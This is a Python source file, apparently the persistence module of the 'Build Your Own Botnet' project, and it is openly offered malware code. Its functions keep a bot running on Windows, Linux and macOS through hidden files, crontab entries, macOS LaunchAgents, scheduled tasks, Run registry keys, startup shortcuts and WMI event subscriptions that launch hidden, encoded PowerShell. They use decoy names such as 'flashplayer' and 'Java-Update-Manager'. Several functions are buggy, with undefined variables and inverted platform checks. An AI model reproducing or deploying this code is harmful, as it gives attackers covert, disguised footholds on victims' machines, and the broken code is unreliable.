#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard libarary
import os
import sys
import random
import subprocess

# byob
import util

methods = {method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job','powershell_wmi']}


@util.config(platforms=['win32','linux2','darwin'])
def add_hidden_file():
    try:
        value = sys.argv[0]
        if value and os.path.isfile(value):
            if os.name is 'nt':
                path = value
                hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
            else:
                dirname, basename = os.path.split(value)
                path = os.path.join(dirname, '.' + basename)
                hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
            return True if hide else False
        else:
            return (False, "File '{}' not found".format(value))
    except Exception as e:
        return (False, 'Adding hidden file error: {}'.format(str(e)))


@util.config(platforms=['linux2'])
def add_crontab_job(minutes=10, name='flashplayer'):
    try:
        if sys.platform == 'linux2':
            value = sys.argv[0]
            if value and os.path.isfile(value):
                if not methods['crontab_job']['established']:
                    user = os.getenv('USERNAME', os.getenv('NAME'))
                    task = "0 */6 * * * {} {}".format(60/minutes, user, path)
                    with open('/etc/crontab', 'r') as fp:
                        data = fp.read()
                    if task not in data:
                        with file('/etc/crontab', 'a') as fd:
                            fd.write('\n' + task + '\n')
                    return (True, path)
                else:
                    return (True, path)
    except Exception as e:
        util.debug("{} error: {}".format(add_crontab_job.func_name, str(e)))
    return (False, None)


@util.config(platforms=['darwin'])
def add_launch_agent(name='com.apple.update.manager'):
    try:
        if sys.platform == 'darwin':
            value = sys.argv[0]
            if value and os.path.isfile(value):
                code    = _resource('resource bash')
                label   = name
                if not os.path.exists('/var/tmp'):
                    os.makedirs('/var/tmp')
                fpath   = '/var/tmp/.{}.sh'.format(name)
                bash    = code.replace('__LABEL__', label).replace('__FILE__', value)
                with file(fpath, 'w') as fileobj:
                    fileobj.write(bash)
                bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                time.sleep(1)
                launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                if os.path.isfile(launch_agent):
                    os.remove(fpath)
                    return (True, launch_agent)
    except Exception as e2:
        util.debug('Error: {}'.format(str(e2)))
    return (False, None)


@util.config(platforms=['win32'])
def add_scheduled_task(name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['scheduled_task'].get('established'):
            value = sys.argv[0]
            name  = util.variable(random.randint(6,11))
            if value and os.path.isfile(value):
                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
                if 'SUCCESS' in result:
                    return (True, result.replace('"', ''))
    except Exception as e:
        util.debug('Add scheduled task error: {}'.format(str(e)))
    return (False, None)


@util.config(platforms=['win32'])
def add_startup_file(name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['powershell_wmi'].get('established'):
            value = sys.argv[0]
            if value and os.path.isfile(value):
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if not os.path.exists(startup_dir):
                    os.makedirs(startup_dir)
                startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                    with file(startup_file, 'w') as fp:
                        fp.write(content)
                return (True, startup_file)
    except Exception as e:
        util.debug('{} error: {}'.format(add_startup_file.func_name, str(e)))
    return (False, None)


@util.config(platforms=['win32'])
def add_registry_key(name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['powershell_wmi'].get('established'):
            value = sys.argv[0]
            if value and os.path.isfile(value):
                try:
                    util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                    return (True, name)
                except Exception as e:
                    util.debug('{} error: {}'.format(add_registry_key.func_name, str(e)))
    except Exception as e:
        util.debug('{} error: {}'.format(add_registry_key.func_name, str(e)))
    return (False, None)


@util.config(platforms=['win32'])
def add_powershell_wmi(command=None, task_name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['powershell_wmi'].get('established'):
            cmd_line  = ""
            value = sys.argv[0]
            if value and os.path.isfile(value):
                cmd_line = 'start /b /min {}'.format(value)
            elif command:
                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
            if cmd_line:
                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
                powershell = _resource('resource powershell').replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
                util.powershell(powershell)
                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
                result = util.powershell(code)
                if task_name in result:
                    return (True, result)
            return (False, None)
    except Exception as e:
        util.debug('{} error: {}'.format(add_powershell_wmi.func_name, str(e)))


@util.config(platforms=['win32'])
def remove_scheduled_task():
    if methods['scheduled_task'].get('established') and os.name == 'nt':
        value = methods['scheduled_task'].get('result')
        try:
             if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                 return (False, None)
        except: pass
    return (methods['scheduled_task']['established'], methods['scheduled_task']['result'])


@util.config(platforms=['win32','linux2','darwin'])
def remove_hidden_file():
    try:
        if methods['hidden_file'].get('established'):
            filename = methods['hidden_file']['result']
            if os.path.isfile(filename):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return (False, None)
                except Exception as e1:
                    util.debug('{} error: {}'.format(remove_hidden_file.func_name, str(e1)))
    except Exception as e2:
        util.debug('{} error: {}'.format(remove_hidden_file.func_name, str(e2)))
    return (methods['hidden_file']['established'], methods['hidden_file']['result'])


@util.config(platforms=['linux2'])
def remove_crontab_job(name='flashplayer'):
    try:
        if sys.platform == 'linux2' and methods['crontab_job'].get('established'):
            with open('/etc/crontab','r') as fp:
                lines = [i.rstrip() for i in fp.readlines()]
                for line in lines:
                    if name in line:
                        _ = lines.pop(line, None)
            with open('/etc/crontab', 'a+') as fp:
                fp.write('\n'.join(lines))
        return (False, None)
    except Exception as e:
        util.debug('{} error: {}'.format(remove_crontab_job.func_name, str(e)))
    return (methods['hidden_file']['established'], methods['hidden_file']['result'])


@util.config(platforms=['darwin'])
def remove_launch_agent(name='com.apple.update.manager'):
    try:
        if methods['launch_agent'].get('established') and os.name == 'nt':
            launch_agent = persistence['launch_agent'].get('result')
            if os.path.isfile(launch_agent):
                util.delete(launch_agent)
                return (False, None)
    except Exception as e:
        util.debug("{} error: {}".format(remove_launch_agent.func_name, str(e)))
    return (methods['launch_agent']['established'], methods['launch_agent']['result'])


@util.config(platforms=['win32'])
def remove_powershell_wmi(task_name='Java-Update-Manager'):
    try:
        if methods['powershell_wmi'].get('established'):
            try:
                code = """
                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'",  Remove-WmiObject
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" ,  Remove-WmiObject
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription ,  Where-Object { $_.filter -match '[NAME]'} ,  Remove-WmiObject""".replace('[NAME]', task_name)
                result = util.powershell(code)
                if not result:
                    return (False, None)
            except: pass
        return (methods['powershell_wmi']['established'], methods['powershell_wmi']['result'])
    except Exception as e:
        util.debug('{} error: {}'.format(add_powershell_wmi.func_name, str(e)))
    return (methods['powershell_wmi']['established'], methods['powershell_wmi']['result'])
    

@util.config(platforms=['win32'])
def remove_registry_key(name='Java-Update-Manager'):
    try:
        if methods['registry_key'].get('established') and os.name == 'nt':
            import _winreg
            value = methods['registry_key'].get('result')
            try:
                key = OpenKey(_winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_ALL_ACCESS)
                _winreg.DeleteValue(key, name)
                _winreg.CloseKey(key)
                return (False, None)
            except: pass
        return (methods['registry_key']['established'], methods['registry_key']['result'])
    except Exception as e:
        util.debug(str(e))


@util.config(platforms=['win32'])
def remove_startup_file():
    try:
        if methods['startup_file'].get('established') and os.name == 'nt':
            value = methods['startup_file'].get('result')
            if value and os.path.isfile(value):
                if os.name != 'nt':
                    return (False, None)
                appdata      = os.path.expandvars("%AppData%")
                startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_file = os.path.join(startup_dir, value) + '.eu.url'
                if os.path.exists(startup_file):
                    util.delete(startup_file)
        return (False, None)
    except Exception as e:
        util.debug('{} error: {}'.format(remove_startup_file.func_name, str(e)))
